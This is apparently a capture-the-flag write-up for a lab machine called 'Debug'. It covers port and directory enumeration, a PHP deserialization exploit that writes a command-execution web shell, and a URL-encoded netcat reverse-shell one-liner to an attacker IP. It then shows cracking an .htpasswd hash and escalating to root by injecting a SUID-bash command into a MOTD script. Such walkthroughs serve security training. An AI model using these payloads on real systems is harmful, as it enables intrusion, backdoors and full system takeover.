# Debug - Medium

* Add ```debug.thm``` to ```/etc/hosts``` and scan the machine - ```nmap -T4 -p- -A -Pn -v debug.thm```:

  * 22/tcp - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.18 ((Ubuntu))

* The page on port 80 leads us to the default landing page for Apache. We can start with some basic enumeration:

  ```sh
  gobuster dir -u http://debug.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning

  ffuf -c -u "http://debug.thm" -H "Host: FUZZ.debug.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # subdomain enumeration

  ffuf -c -u "http://debug.thm" -H "Host: FUZZ.debug.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 11321 -s
  # filtering false positives

  gobuster vhost -u http://debug.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enumeration
  ```

* Directory scanning gives us some interesting finds:

  * /index.php
  * /javascript
  * /message.txt
  * /backup
  * /readme.md
  * /grid
  * /less
  * /javascripts

* /readme.md mentions a JS framework named Base; this could be used here but we would need to check further

* /index.php includes a sample page for Base

* /less and /javascripts include the files as mentioned in the README; /grid includes a .psd file which contains a grid for Base. So we can infer Base framework is being used

* /message.txt has a template for an email message

* /backup includes similar directories as above - the files 'index.html.bak' and 'index.php.bak' were not seen before

* The 'index.html.bak' file does not have anything interesting; nothing seems different from the current /index.html

* 'index.php.bak' however includes the following snippet:

  ```php

  class FormSubmit {

  public $form_file = 'message.txt';
  public $message = '';

  public function SaveMessage() {

  $NameArea = $_GET['name']; 
  $EmailArea = $_GET['email'];
  $TextArea = $_GET['comments'];

    $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

  }

  public function __destruct() {

  file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
  echo 'Your submission has been successfully saved!';

  }

  }

  // Leaving this for now... only for debug purposes... do not touch!

  $debug = $_GET['debug'] ?? '';
  $messageDebug = unserialize($debug);
  ```

* We can test for [PHP deserialization attacks](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) as the user input is not sanitized in this case. Since ```unserialize()``` is used to unserialize a HTTP GET variable, we will be controlling the value of ```messageDebug```.

* [Here is an example](https://www.bootlesshacker.com/php-deserialization/) that we will be following; we can create this PHP file first based on the 'index.php.bak' file:

  ```php
  <?php

  class FormSubmit {
    public $form_file = 'shell.php';
    public $message = '<?php system($_GET["cmd"]); ?>';
  }

  echo urlencode(serialize(new FormSubmit));

  ?>
  ```

  ```sh
  php -q test.php
  # creates the object and serializes it into a string according to set values
  # and prints URL-encoded serialized string

  curl http://debug.thm/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D
  ```

* Now, if we navigate to <http://debug.thm/shell.php?cmd=id>, we get RCE

* We can get a reverse shell after setting up a listener using ```nc -nvlp 4444```; in webshell, this URL-encoded payload can be used - ```rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.112.53%204444%20%3E%2Ftmp%2Ff```:

  ```sh
  # in reverse shell
  # we can first upgrade to stable shell
  which python3

  python3 -c 'import pty;pty.spawn("/bin/bash")'

  export TERM=xterm
  # Ctrl+Z now
  stty raw -echo; fg
  # press Enter key twice

  pwd
  # /var/www/html

  ls -la
  # we have .htpasswd

  cat .htpasswd
  # this gives us a hash

  ls -la /home
  # we have user 'james'

  ls -la /home/james
  # permission denied
  ```

* We can crack the hash found in ```.htpasswd``` using ```hashcat```:

  ```sh
  vim apachehash.txt
  # paste hash here

  hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
  # this gives us the password 'jamaica'
  ```

* We can attempt SSH login using these creds:

  ```sh
  ssh james@debug.thm
  # this works

  cat user.txt
  # get user flag

  ls -la
  # we can check other files here

  less Note-To-James.txt
  # the note mentions SSH welcome message
  # it also mentions James has permissions to modify those files

  # we can check the MOTD files
  ls -la /etc/update-motd.d/
  # 'james' has rwx permissions
  ```

* Since we have the permission to modify the MOTD files, we can [inject some code for privesc](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/):

  ```sh
  echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> /etc/update-motd.d/00-header
  # copy bash binary and give suid to it

  # now we can logout of ssh
  exit

  # and login again
  ssh james@debug.thm

  ls -la
  # we do have a bash binary here

  ./bash -p
  # root shell
  ```
